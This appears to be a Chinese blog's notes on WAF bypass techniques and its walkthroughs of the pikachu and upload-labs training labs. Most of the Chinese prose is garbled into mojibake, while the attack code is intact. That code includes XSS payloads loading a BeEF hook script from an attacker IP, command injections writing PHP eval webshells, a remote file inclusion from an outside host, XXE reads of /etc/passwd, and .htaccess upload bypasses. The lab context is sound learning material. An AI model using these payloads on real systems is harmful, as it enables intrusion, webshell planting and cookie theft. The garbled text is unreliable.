å‚æ•°æ±¡æŸ“ï¼ˆHPPï¼‰ç®€å•æ¥è¯´ï¼Œå­˜åœ¨å¤šä¸ªåŒåå‚æ•°çš„æƒ…å†µä¸‹ï¼Œå¯èƒ½å­˜åœ¨é€»è¾‘å±‚å’ŒWAFå±‚å¯¹å‚æ•°çš„å–å€¼ä¸åŒï¼Œå³å¯èƒ½é€»è¾‘å±‚ä½¿ç”¨çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œè€ŒWAFå±‚ä½¿ç”¨çš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œæˆ‘ä»¬åªéœ€è¦ç¬¬äºŒä¸ªå‚æ•°æ­£å¸¸ï¼Œåœ¨ç¬¬ä¸€ä¸ªå‚æ•°æ’å…¥payloadï¼Œè¿™æ ·ç»„åˆèµ·æ¥å°±å¯ä»¥ç»•è¿‡WAFï¼Œå¦‚ä¸‹æ•°æ®åŒ…ï¼š 1234GET /foo?par=first&amp;par=last HTTP/1.1User-Agent: Mozilla/5.0Host: HostAccept: */* éƒ¨åˆ†ä¸­é—´ä»¶çš„å¤„ç†æ–¹æ³•ï¼š Webç¯å¢ƒ å‚æ•°è·å–å‡½æ•° è·å–åˆ°çš„å‚æ•° PHP/Apache $_GET(â€œparâ€) last JSP/Tomcat Request.getParameter(â€œparâ€) first Perl(CGI)/Apache Param(â€œparâ€) first Python/Apache getvalue(â€œparâ€) [â€œfirstâ€,â€lastâ€] ASP.NET/IIS Request.QueryString(â€œparâ€) first,last Pipelineï¼ˆkeep-aliveï¼‰httpè¯·æ±‚å¤´éƒ¨ä¸­æœ‰Connectionè¿™ä¸ªå­—æ®µï¼Œå»ºç«‹çš„tcpè¿æ¥ä¼šæ ¹æ®æ­¤å­—æ®µçš„å€¼æ¥åˆ¤æ–­æ˜¯å¦æ–­å¼€ï¼Œå½“å‘é€çš„å†…å®¹å¤ªå¤§ï¼Œè¶…è¿‡ä¸€ä¸ªhttpåŒ…å®¹é‡ï¼Œéœ€è¦åˆ†å¤šæ¬¡å‘é€æ—¶ï¼Œå€¼ä¼šå˜æˆkeep-aliveï¼Œå³æœ¬æ¬¡å‘èµ·çš„httpè¯·æ±‚æ‰€å»ºç«‹çš„tcpè¿æ¥ä¸æ–­å¼€ï¼Œç›´åˆ°æ‰€å‘é€å†…å®¹ç»“æŸConnectionä¸ºcloseä¸ºæ­¢ æˆ‘ä»¬å¯ä»¥æ‰‹åŠ¨å°†æ­¤å€¼ç½®ä¸ºkeep-aliveï¼Œç„¶ååœ¨httpè¯·æ±‚æŠ¥æ–‡ä¸­æ„é€ å¤šä¸ªè¯·æ±‚ï¼Œå°†æ¶æ„ä»£ç éšè—åœ¨ç¬¬nä¸ªè¯·æ±‚ä¸­ï¼Œä»è€Œç»•è¿‡waf è®°å¾—æŠŠbrupsuiteè‡ªåŠ¨æ›´æ–°Content-Lengthçš„å‹¾å»æ‰ 123456789101112131415161718POST / HTTP/1.1Host: www.baidu.comUser-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateUpgrade-Insecure-Requests: 1Connection: Keep-AliveContent-Type: application/x-www-form-urlencodedContent-Length: 3a=1GET / HTTP/1.1Host: www.baidu.comUser-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateUpgrade-Insecure-Requests: 1Connection: close HTTP charsetåˆ©ç”¨Content-Type: xxx;charset=xxxç¼–ç ç»•è¿‡ï¼Œpayloadè½¬ä¹‰åï¼Œç”±äºå¤§éƒ¨åˆ†çš„WAFé»˜è®¤ç”¨UTF8ç¼–ç æ£€æµ‹ï¼Œæ‰€ä»¥èƒ½ç”¨æ­¤æ–¹æ³•æ¥è¾¾åˆ°ç»•è¿‡å…³é”®è¯è¿‡æ»¤çš„æ•ˆæœ 123application/x-www-form-urlencoded; charset=ibm037multipart/form-data; charset=ibm037, boundary=blahmultipart/form-data; boundary=blah ; charset=ibm037 WAFç‰¹æ€§äº‘WAFç»•è¿‡æ‰¾åˆ°çœŸå®IPï¼Œä¿®æ”¹æœ¬åœ°hostsæ–‡ä»¶æˆ–è€…ç›´æ¥åœ¨burpä¸­æŒ‡å®šè§£æï¼Œé¿å…æµé‡èµ°åˆ°äº‘WAFä¸Šå³å¯ã€‚ ç™½åå•ç»•è¿‡ä¸€äº›WAFä¸ºäº†ä¿è¯æ ¸å¿ƒåŠŸèƒ½å¦‚ç™»é™†åŠŸèƒ½æ­£å¸¸ï¼Œä¼šåœ¨å†…éƒ¨è®¾ç«‹ä¸€ä¸ªæ–‡ä»¶ç™½åå•ï¼Œæˆ–å†…å®¹ç™½åå•ï¼Œåªè¦å’Œè¿™äº›æ–‡ä»¶æˆ–å†…å®¹æœ‰å…³ï¼Œæ— è®ºæ€ä¹ˆæµ‹è¯•ï¼Œéƒ½ä¸ä¼šè¿›è¡Œæ‹¦æˆªã€‚ å¦‚ï¼šWAFè®¾ç«‹äº†ç™½åå•/adminï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„æµ‹è¯•payloadå¯ä»¥é€šè¿‡å¦‚ä¸‹çš„æ‰‹æ³•æ¥ç»•è¿‡ 1234# åŸæ¥è¢«æ‹¦æˆªhttp://a.a/?id=123 and 2*3=6# ç°åœ¨ä¸æ‹¦æˆªhttp://a.a/?a=/admin&amp;id=123 and 2*3=6 é™æ€æ–‡ä»¶ç»•è¿‡ä¸€äº›WAFä¸ºäº†å‡å°‘æœåŠ¡å™¨çš„å‹åŠ›ï¼Œä¼šå¯¹é™æ€æ–‡ä»¶å¦‚.pngã€.cssç­‰ç›´æ¥æ”¾è¡Œï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å°è¯•ä¼ªè£…æˆé™æ€æ–‡ä»¶æ¥ç»•è¿‡ å¦‚ï¼š 1234# åŸæ¥è¢«æ‹¦æˆªhttp://a.a/?id=123 and 2*3=6# ç°åœ¨ä¸æ‹¦æˆªhttp://a.a/?1.jpg&amp;id=123 and 2*3=6 Content-Typeç»•è¿‡ä¸€äº›WAFè¯†åˆ«åˆ°ç‰¹å®šçš„content-typeåï¼Œåˆ™ä¼šåˆ¤å®šä¸ºè¯¥è¯·æ±‚çš„ç±»å‹ï¼Œå¦‚ï¼š å‘ç°Content-Typeä¸ºmultipart/form-dataæ—¶ï¼Œä¼šè®¤ä¸ºè¿™å±äºæ–‡ä»¶ä¸Šä¼ çš„è¯·æ±‚ï¼Œä»è€Œåªæ£€æµ‹æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œå¯¼è‡´ä¸æ‹¦æˆªå…¶ä»–ç±»å‹çš„payload è¯·æ±‚æ–¹å¼ç»•è¿‡ ä¸€äº›WAFå¯¹äºgetè¯·æ±‚å’Œpostè¯·æ±‚çš„å¤„ç†æœºåˆ¶ä¸ä¸€æ ·ï¼Œå¯èƒ½å¯¹POSTè¯·æ±‚ç¨åŠ æ¾æ‡ˆï¼Œå› æ­¤ç»™GETè¯·æ±‚å˜æˆPOSTè¯·æ±‚æœ‰å¯èƒ½ç»•è¿‡æ‹¦æˆªã€‚ ä¸€äº›WAFæ£€æµ‹åˆ°POSTè¯·æ±‚åï¼Œå°±ä¸ä¼šå¯¹GETæºå¸¦çš„å‚æ•°è¿›è¡Œè¿‡æ»¤æ£€æµ‹ï¼Œå› æ­¤å¯¼è‡´è¢«ç»•è¿‡ã€‚ è§£æå…¼å®¹æ€§ä¸€äº›WAFæ£€æµ‹æ—¶ï¼Œå®Œå…¨æŒ‰ç…§æ ‡å‡†çš„HTTPåè®®å»åŒ¹é…ï¼Œä½†WEBå®¹å™¨ä¼šåšä¸€äº›å…¼å®¹æ€§é€‚é…ï¼Œå¦‚ä¸Šä¼ æ—¶ 1filename=&quot;shell.php&quot; æˆ‘ä»¬åªéœ€è¦ç¨åŠ ä¿®æ”¹ï¼Œé‚£ä¹ˆæŒ‰ç…§æ ‡å‡†åè®®å»è§£æå°±æ‰¾ä¸åˆ°æ–‡ä»¶åï¼Œä»è€Œç»•è¿‡æ‹¦æˆª 123filename=&quot;shell.phpfilename='shell.php'filename=shell.php å®¹å™¨ç‰¹æ€§ Tip å¯é€šè¿‡æ‰€æœ‰fuzzä¸€éï¼Œçœ‹çœ‹å®¹å™¨æ˜¯å¦‚ä½•å¤„ç†çš„ IIS+ASPï¼š %ä¼šè¢«è‡ªåŠ¨å»æ‰ unicodeä¼šè‡ªåŠ¨è§£ç  1&lt;script&gt; == &lt;%s%cr%u0131pt&gt; tomcat: è·¯å¾„ç©¿è¶Š 1/path1/path2/ == ;/path1;foo/path2;bar/;","link":"/2025/12/18/%E9%80%9A%E7%94%A8%E7%BB%95waf/"},{"title":"","text":"pikachu+xss+ssti-labsæ±‡æ€» pikachué¶åœºXSSåå°„å‹GETå±å®³å‰ç«¯ç”¨æˆ·çªƒå–cookie 1sudo beef-xss http://127.0.0.1:3000/ui/panelbeef2005 1http://&lt;IP&gt;:3000/hook.js åå°„å‹(get)1?message=&lt;script src=&quot;http://172.27.245.57:3000/hook.js&quot;&gt;&lt;/script&gt;&amp;submit=submit æ’­æ”¾éŸ³é¢‘ åœ¨kaliæ¡Œé¢ç›‘å¬ 1python3 -m http.server 8000 ç„¶åå»è®¿é—® 1http://172.27.245.57:8000/misc.wav å°±æˆåŠŸæ’­æ”¾äº†éŸ³ä¹ åå°„å‹POST1&lt;script&gt;alert(1)&lt;/script&gt; å­˜å‚¨å‹æ‰§è¡Œåä¸€ç›´ä¼šå¼¹çª— 1&lt;script&gt;alert('test')&lt;/script&gt; domå‹æ‹¼æ¥ 1234567&lt;a href='&quot;+str+&quot;'&gt;what do you see?&lt;/a&gt;'&gt;&lt;img src=&quot;###&quot; onmouseover=&quot;alert('xss')&quot;&gt;&lt;a href=''&gt;&lt;img src=&quot;###&quot; onmouseover=&quot;alert('xss')&quot;&gt;'onclick=&quot;alert('xss')&quot;&gt;&lt;a href=''onclick=&quot;alert('xss')&quot;&gt;'&gt;what do you see?&lt;/a&gt; domå‹xss-x1234567&lt;a href='&quot;+str+&quot;'&gt;what do you see?&lt;/a&gt;'&gt;&lt;img src=&quot;###&quot; onmouseover=&quot;alert('xss')&quot;&gt;&lt;a href=''&gt;&lt;img src=&quot;###&quot; onmouseover=&quot;alert('xss')&quot;&gt;'onclick=&quot;alert('xss')&quot;&gt;&lt;a href=''onclick=&quot;alert('xss')&quot;&gt;'&gt;what do you see?&lt;/a&gt; å¤šç‚¹ä¸€éƒ¨ xssç›²æ‰“ä¾æ—§xss-beef 1&lt;script src=&quot;http://172.27.245.57:3000/hook.js&quot;&gt;&lt;/script&gt; æ‹¿åˆ°ç®¡ç†å‘˜cookieå°±å¯ä»¥ç”¨ç®¡ç†å‘˜ç™»é™† xssè¿‡æ»¤å°±æ˜¯è¿‡æ»¤äº†scriptç›´æ¥ 1&lt;img src=&quot;onerror='alert(1)'/&gt;' xss-htmlspecialchars htmlspecialcharsåœ¨php8ç‰ˆæœ¬å‰æ˜¯ä¸ä¼šå¯¹â€™åšè½¬ä¹‰çš„ 1'onclick='alert(1)' xssä¹‹hrefè¾“å‡º 1'onclick='alert(1)' ã€å•å¼•å·æ¯è½¬ä¹‰äº† 1javascript:alert(1) xssä¹‹jsè¾“å‡ºç›´æ¥é—­åˆæ³¨é‡Šåé¢çš„ 1';alert(1)// RCEpinglinux 1127.0.0.1;echo '&lt;?php @eval($_POST['attack']);?&gt;' &gt; 1.php windows 12127.0.0.1 &amp; dir127.0.0.1 &amp; echo &quot;&lt;?php @eval($_POST['attack']);?&gt;&quot; &gt; 1.php eval1system('echo '&lt;?php @eval($_POST['attack']);?&gt;' &gt; 1.php'); æ–‡ä»¶åŒ…å«æœ¬åœ°æ–‡ä»¶åŒ…å« å¯ä»¥æ–‡ä»¶åŒ…å«è¯»æ–‡ä»¶ 1file:///etc/passwd è¿œç¨‹æ–‡ä»¶åŒ…å«1?filename=115.190.102.32:8000/1.txt ç”¨.txtåç¼€è®¿é—®å³å¯ 123&lt;?php file_put_contents(&quot;shell2.php&quot;, 'eval($_POST[&quot;1&quot;]);');?&gt; æ–‡ä»¶ä¸Šä¼ client typeå†™ä¸€ä¸ªwebshellæ­£å¸¸å›¾ç‰‡æŠ“åŒ…æ”¹phpå°±æˆåŠŸä¸Šä¼ äº† MIMEç±»å‹ä¿®æ”¹Content-Type:ä¸ºä»¥ä¸‹å†…å®¹ä»»æ„ 1234567image/apngimage/avifimage/gifimage/jpegimage/pngimage/svg+xmlimage/webp getimagesizeå‡½æ•°è¦æ±‚æ˜¯æœ‰æ•ˆçš„å›¾åƒæ–‡ä»¶ å°†æ–‡ä»¶çš„åç¼€æ”¹pngå¹¶ä¸èƒ½ç»•çœŸå›¾åƒé‡Œé¢é™„å¸¦ä¿¡æ¯ 1copy 1cc.png /b +she.php /a shell.png ä¸Šä¼ shell.pngå°±ç›´æ¥ä¸Šä¼ æˆåŠŸäº† ç»å¯¹è·¯å¾„æ–‡ä»¶åŒ…å«æ‹¼æ¥å›¾ç‰‡(ç»å¯¹è·¯å¾„) 1?filename=../../../../var/www/html/vul/unsafeupload/uploads/2025/12/12/371470693b111177b45306121694.png è¶Šæƒæ¼æ´æ°´å¹³è¶Šæƒlucy/123456,lili/123456,kobe/123456 è®¿é—®å…¶ä»–ç”¨æˆ·ä¿¡æ¯ å‚ç›´è¶Šæƒè¿™é‡Œæœ‰ä¸¤ä¸ªç”¨æˆ·admin/123456,pikachu/000000,adminæ˜¯è¶…çº§boss ç®€å•æ¥è¯´å°±æ˜¯ä»¥æ™®é€šç”¨æˆ·è®¿é—®ç®¡ç†å‘˜ç®¡ç†é¡µé¢urlå¯ä»¥ç›´æ¥ä¿®æ”¹ xxeä»€ä¹ˆæ˜¯XML?ç”¨æ¥ä¼ è¾“æ•°å€¼è¯»å–æœ¬åœ°æ–‡ä»¶ 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE root [ &lt;!ENTITY hello SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt; &lt;root&gt;&amp;hello;&lt;/root&gt; CTRL+U ï¼šURLåŠ å¯† 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE root [ &lt;!ENTITY hello SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt; &lt;root&gt;&amp;hello;&lt;/root&gt; æ¢æµ‹å†…ç½‘å­˜æ´»ç«¯å£ 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE root [ &lt;!ENTITY hello SYSTEM &quot;http://127.0.0.1:80&quot;&gt; ]&gt; &lt;root&gt;&amp;hello;&lt;/root&gt; çˆ†ç ´80è¿™é‡Œï¼Œå°±å¯ä»¥çœ‹å†…ç½‘å“ªäº›ç«¯å£å¼€äº† ååºåˆ—åŒ– 1234567891011&lt;?php class Person { var $name; var $height; } $zhangsan=new Person(); $zhangsan-&gt;name='å¼ ä¸‰'; //var_dump($zhangsan); echo serialize($zhangsan); 1234567891011121314&lt;?php class Person { var $name; var $height; } $zhangsan=new Person(); $zhangsan-&gt;name='å¼ ä¸‰'; //var_dump($zhangsan); $zhangsan-&gt;height=20; echo serialize($zhangsan);O:6:&quot;Person&quot;:2:{s:4:&quot;name&quot;;s:6:&quot;å¼ ä¸‰&quot;;s:6:&quot;height&quot;;i:20;} ååºåˆ—åŒ–å‡½æ•° 123456789&lt;?php class Person { var $name; var $height; }$s='O:6:&quot;Person&quot;:2:{s:4:&quot;name&quot;;s:6:&quot;å¼ ä¸‰&quot;;s:6:&quot;height&quot;;i:20;}';un å¯¼è‡´é—®é¢˜æ˜¯å› ä¸ºä¸€äº›é­”æ³•å‡½æ•° constructåˆ›å»ºdestructé”€æ¯,è¿è¡Œç»“æŸå°±é”€æ¯tostringå½“ä½œå­—ç¬¦ä¸²sleep 12345678910111213&lt;?php class s { var $test = &quot;pikachu&quot;; function __destruct() { echo $this-&gt;test; } } $s = new s(); $s-&gt;test = &quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;; echo serialize($s); ?&gt; CSRFgetè·¨ç«™è¯·æ±‚ä¼ªé€ vince/allen/kobe/grady/kevin/lucy/lili,å¯†ç å…¨éƒ¨æ˜¯123456ä¿®æ”¹ä¸ªäººä¿¡æ¯ uploads-labsless-1å‰ç«¯jsæ ¡éªŒ å¤åˆ¶ä¸‹é¢çš„ä»£ç  1234567891011121314151617function checkFile() { var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == &quot;&quot;) { alert(&quot;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!&quot;); return false; } //å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹ var allow_ext = &quot;.jpg|.png|.gif&quot;; //æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹ var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;)); //åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼  if (allow_ext.indexOf(ext_name) == -1) { var errMsg = &quot;è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ &quot; + allow_ext + &quot;ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š&quot; + ext_name; alert(errMsg); return false; }} ç„¶åæ”¹åŠ ä¸€ä¸ªå…è®¸php,åœ¨ç»ˆç«¯è·‘ä¸€ä¸‹å°±å¯ä»¥äº† 1234567891011121314151617function checkFile() { var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == &quot;&quot;) { alert(&quot;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!&quot;); return false; } //å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹ var allow_ext = &quot;.jpg|.png|.gif|.php&quot;; //æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹ var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;)); //åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼  if (allow_ext.indexOf(ext_name) == -1) { var errMsg = &quot;è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ &quot; + allow_ext + &quot;ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š&quot; + ext_name; alert(errMsg); return false; }} ç„¶åå°±å¯ä»¥ä¸Šä¼ äº† æ–¹æ³•äºŒï¼š less-2 less-3è¿™æ¬¡ä½¿ç”¨äº†é»‘åå•åç«¯è¿‡æ»¤ å¹¶ä¸”è¿˜ä¼šå¯¹ä¸Šä¼ çš„æ–‡ä»¶é‡å‘½å å°è¯•å…¶ä»–phpåç¼€ 123456789.php3.php4.php5.php7.phps.php-s.pht.phar.phtml ä¸Šä¼ php5æˆåŠŸåœ¨æºä»£ç çœ‹åˆ°ä¸Šä¼ è·¯åŠ² èšå‰‘è¿”å›ä¸ºç©ºè¯´æ˜æœªè¢«è§£ææˆåŠŸä¸è§£æè¯´æ˜åœ¨appacheçš„httpd.confé‡Œé¢æ²¡æœ‰ä¸‹é¢è¿™ä¸€è¡Œ 1AddType application/x-httpd-php .php .php3 .php5 .phtml æˆ‘ä»¬è¿™é‡Œå¦‚æœä¸æ˜¯æœ¬åœ°çš„é¶åœºå°±æ— æ³•å»ä¿®æ”¹è¿™ä¸ªæ–‡ä»¶ ç„¶åå°±å¯ä»¥äº† less-4æœ¬passç¦æ­¢ä¸Šä¼ .php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swfåç¼€æ–‡ä»¶ï¼ 123456789101112åˆ›å»º.htaccessæ–‡ä»¶ï¼Œä»£ç å¦‚ä¸‹ï¼šæ–¹æ³•ä¸€ï¼š&lt;FilesMatch &quot;4.png&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;#å¦‚æœå½“å‰ç›®å½•ä¸‹æœ‰4.pngï¼Œå°±ä¼šè¢«è§£æä¸º.php æ–¹æ³•äºŒï¼šAddType application/x-httpd-php .png#å¦‚æœå½“å‰ç›®å½•ä¸‹æœ‰ä»¥.pngç»“å°¾çš„æ–‡ä»¶ï¼Œå°±ä¼šè¢«è§£æä¸º.php less-5 è€Œ.user.iniå’Œ.htaccessä¸€æ ·æ˜¯ç›®å½•çš„é…ç½®æ–‡ä»¶ï¼Œ.user.iniå°±æ˜¯ç”¨æˆ·è‡ªå®šä¹‰çš„php.iniï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªæ–‡ä»¶æ¥æ„é€ åé—¨å’Œéšè—åé—¨ã€‚.user.iniä½¿ç”¨èŒƒå›´å¾ˆå¹¿ï¼Œä¸ä»…é™äº Apache æœåŠ¡å™¨ï¼ŒåŒæ ·é€‚ç”¨äº NginxæœåŠ¡å™¨ï¼Œåªè¦æœåŠ¡å™¨å¯ç”¨äº† fastcgi æ¨¡å¼ (é€šå¸¸éçº¿ç¨‹å®‰å…¨æ¨¡å¼ä½¿ç”¨çš„å°±æ˜¯ fastcgi æ¨¡å¼)ã€‚ 12345.user.ini é…ç½®é¡¹ä¸­æœ‰ä¸¤ä¸ªé…ç½®å¯ä»¥èµ·åˆ°ä¸€äº›ä½œç”¨æ–¹æ³•ä¸€ï¼šauto_prepend_file = &lt;filename&gt; //åŒ…å«åœ¨æ–‡ä»¶å¤´æ–¹æ³•äºŒï¼šauto_append_file = &lt;filename&gt; //åŒ…å«åœ¨æ–‡ä»¶å°¾ less-6æ–‡ä»¶å¤§å°å†™è¿‡æ»¤ä¸ä¸¥è°¨ 123å¤§å°å†™ç»•è¿‡åŸç†ï¼šWindowsç³»ç»Ÿä¸‹ï¼Œå¯¹äºæ–‡ä»¶åä¸­çš„å¤§å°å†™ä¸æ•æ„Ÿã€‚ä¾‹å¦‚ï¼štest.phpå’ŒTeSt.PHPæ˜¯ä¸€æ ·çš„ã€‚Linuxç³»ç»Ÿä¸‹ï¼Œå¯¹äºæ–‡ä»¶åä¸­çš„å¤§å°å†™æ•æ„Ÿã€‚ä¾‹å¦‚ï¼štest.phpå’Œ TesT.phpå°±æ˜¯ä¸ä¸€æ ·çš„ã€‚ less-7123456array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = $_FILES['upload_file']['name']; $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA å‘ç°æ²¡æœ‰å¯¹ä¸Šä¼ çš„æ–‡ä»¶ååšå»ç©ºæ ¼çš„æ“ä½œ-&gt;trim()åˆ©ç”¨burpæŠ“åŒ…ï¼Œä¿®æ”¹å¯¹åº”çš„æ–‡ä»¶å æ·»åŠ ç©ºæ ¼ã€‚Windowsç³»ç»Ÿä¸‹ï¼Œå¯¹æ–‡ä»¶åä¸­ç©ºæ ¼ä¼šè¢«ä½œä¸ºç©ºå¤„ç†ï¼Œç¨‹åºä¸­çš„æ£€æµ‹ä»£ç å´ä¸èƒ½è‡ªåŠ¨åˆ é™¤ç©ºæ ¼ã€‚ä»è€Œç»•è¿‡é»‘åå•. less-8(windowsç¯å¢ƒ)123456$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;);$file_name = trim($_FILES['upload_file']['name']);$file_ext = strrchr($file_name, '.');$file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™$file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA$file_ext = trim($file_ext); //é¦–å°¾å»ç©º Windows ç³»ç»Ÿï¼ˆNTFS/FAT32/ExFAT ç­‰ä¸»æµæ–‡ä»¶ç³»ç»Ÿï¼‰çš„æ–‡ä»¶å‘½åè§„èŒƒ ä¸­ï¼Œå­˜åœ¨ä¸€ä¸ªå…³é”®è®¾è®¡ï¼šä¸å…è®¸æ–‡ä»¶å / æ–‡ä»¶åç¼€çš„æœ«å°¾ä»¥è‹±æ–‡å¥ç‚¹ï¼ˆ.ï¼‰ç»“å°¾ï¼Œå½“ç³»ç»Ÿå¤„ç†ä»¥.ç»“å°¾çš„æ–‡ä»¶åæ—¶ï¼Œä¼šè‡ªåŠ¨æˆªæ–­æœ«å°¾çš„æ‰€æœ‰å¥ç‚¹ï¼ˆåŒ…æ‹¬å•ä¸ª / å¤šä¸ªæœ«å°¾ç‚¹ï¼‰ã€‚ ç„¶åå»æ‰.å‘ç°å¯¹ä¸Šä¼ çš„æ–‡ä»¶åç¼€åæœªåšå»ç‚¹.çš„æ“ä½œâ€”&gt;strrchr($file_name, '.')Windowsç³»ç»Ÿä¸‹ï¼Œæ–‡ä»¶åç¼€åæœ€åä¸€ä¸ªç‚¹ä¼šè¢«è‡ªåŠ¨å»é™¤ã€‚ä¸Šä¼  8.php. less-9(Windowsç¯å¢ƒ)Windowsæ–‡ä»¶ä¸Šä¼ ::$DATAç»•è¿‡ä¸Šä¼ NTFSæ•°æ®æµDATAæµç±»å‹a.php::$DATA é»‘åå•æ²¡æœ‰åŒ…å« åˆ°Windowsä¸Šä¼ æˆåŠŸåä¼šè‡ªåŠ¨åˆ é™¤::$DATA less-10ï¼ˆWindowsç¯å¢ƒæ“ä½œï¼‰12345678$deny_ext = 